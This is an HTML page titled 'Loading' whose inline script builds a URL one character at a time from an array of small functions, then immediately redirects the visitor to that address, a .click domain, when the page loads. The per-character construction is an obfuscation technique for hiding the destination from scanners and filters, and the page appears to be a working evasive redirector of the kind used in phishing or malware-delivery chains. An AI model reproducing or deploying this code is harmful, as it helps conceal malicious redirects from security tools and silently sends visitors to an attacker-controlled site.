<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            () => 't',
            () => 't',
            () => 'p',
            function() { return 's'; },
            () => ':',
            function() { return '/'; },
            function() { return '/'; },
            function() { return 'v'; },
            () => 'e',
            () => 'r',
            () => 'g',
            function() { return 'e'; },
            function() { return 'n'; },
            function() { return '.'; },
            _ => 'c',
            _ => 'l',
            () => 'i',
            () => 'c',
            _ => 'k',
            () => '/',
            _ => 's',
            _ => '/',
            _ => 'n',
            () => 'e',
            () => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
